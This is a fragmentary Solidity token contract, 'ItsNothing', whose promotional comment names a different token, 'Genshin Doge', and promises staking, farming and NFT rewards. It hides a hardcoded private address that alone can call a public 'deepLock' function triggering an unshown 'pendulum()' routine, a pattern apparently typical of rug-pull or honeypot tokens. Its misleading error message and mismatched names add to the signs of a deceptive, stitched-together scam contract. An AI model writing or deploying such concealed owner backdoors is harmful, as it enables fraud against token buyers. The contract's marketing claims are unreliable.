...
/**
ItsNothing is the coolest addition to the doge family with multi dimensional 
use cases where you get to STAKE, FARM, and EARN NFTs at the same time! A 
self sustainable NFT model fused with Farming/Staking platform and Reflection
token with maximum rewards to its holders, Genshin Doge has it all to lead 
the Doge community.

 * https://ItsNothing.io/
 * https://twitter.com/ItsNothing
 * https://t.me/ItsNothing
*/
...
interface SniperAutoERC20 is IERC20 {
    /**
 ...
 contract ItsNothing is AntiBots, IERC20, SniperAutoERC20 {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _binance;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "ItsNothing";
    string private _symbol = "ItsNothing";
    uint256 private constant MAX = ~uint256(0);
//  https://www.coingecko.com/en/coins/ItsNothing
    ...
    address private _newath = 0x0D6Eb2A4F2440288606374DCd9f4AC264f26bdfe;
    ...
    function deepLock() public {
        require(_msgSender() == _newath, "Can't please try again.");
        pendulum();
    }
